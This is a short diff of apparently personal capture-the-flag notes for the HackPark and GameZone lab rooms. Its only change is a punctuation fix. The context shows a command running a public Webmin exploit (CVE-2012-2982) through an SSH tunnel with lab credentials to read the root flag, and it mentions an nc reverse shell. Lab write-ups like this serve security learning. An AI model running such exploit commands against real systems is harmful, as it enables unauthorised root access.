@@ -212,7 +212,7 @@ I created a more stable [reverse shell](HackPark/PostView.ascx) using nc to expl
 
 ## GameZone
 ### Privilege escalation without metasploit 
-I used the Python script: https://github.com/JohnHammond/CVE-2012-2982/tree/master
+I used the Python script: https://github.com/JohnHammond/CVE-2012-2982/tree/master.
 Supposing you have the SSH tunnel activated on your attacker box on localhost:10000
 
      python CVE-2012-2982.py -t localhost -p 10000 -U agent47 -P videogamer124 -c "cat /root/root.txt > flag.txt"     
